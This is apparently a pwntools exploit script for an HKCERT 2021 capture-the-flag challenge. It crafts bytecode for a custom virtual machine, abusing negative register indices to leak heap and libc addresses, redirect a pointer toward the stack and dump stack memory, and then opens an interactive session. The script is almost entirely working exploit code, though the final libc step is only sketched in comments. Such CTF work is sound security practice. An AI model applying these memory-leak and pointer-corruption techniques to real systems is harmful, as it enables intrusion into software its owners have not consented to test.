from pwn import *

context.log_level = "debug"

# mov $0 "abc"
payload = b"\x01\x01\x00\x00\x03abc"

# $-7 contains $-3 content, which can leak and change
# mov $0 $-7, syscall 2
payload = b"\x01\x01\x00\x01\xf9\x1c\x02"

# input (input diff here)
payload += b"\x1c\x00"

# xor input with $-7, change -3 base pt to leak libc addr
payload += b"\x07\x01\xf9\x01\x00"

# verify, print $-7
# mov $0 $-7, syscall 2
payload += b"\x01\x01\x00\x01\xf9\x1c\x02"

# mov $0 $-3, syscall 2
payload += b"\x01\x01\x00\x01\xfd\x1c\x02"


f = open("payload", "wb")
f.write(payload)
f.close()

#r = remote('chalp.hkcert21.pwnable.hk', 28246)
r = remote('0.0.0.0', 28246)
#r = process(["public/src/vm", "payload"])

print(r.recv())
r.send(payload.hex())
r.sendline("EOF")

neg7 = r.recv()[:-1]
neg7 = bytes.fromhex(neg7.decode('ascii'))
heap0 = u64(neg7[:8])
print("heap addr:", hex(heap0))
unknown_reg = u64(neg7[8:16])
reg_base = u64(neg7[16:24])
print("reg_base:", hex(reg_base))

# target_stack = reg_base - 0x18*35 -8
target_stack = reg_base - 0x18*35
target = target_stack ^ unknown_reg
r.send(b'\0'*8+p64(target))

neg7 = r.recvline()[:-1]
neg7 = bytes.fromhex(neg7.decode('ascii'))
a = u64(neg7[8:16])
b = u64(neg7[16:24])
print('$-3 base:', hex(a))
print('$-3 end:', hex(b))

# dump stack
neg3 = r.recvline()[:-1]
print(len(neg3))
neg3 = bytes.fromhex(neg3.decode('ascii'))
for i in range(35*3):
    print(hex(u64(neg3[8*i:8*i+8])))

# get base addr
# fclose+243
# base - 35*0x18 = fclose+243, libc

#r.send("a"*10)
r.interactive()
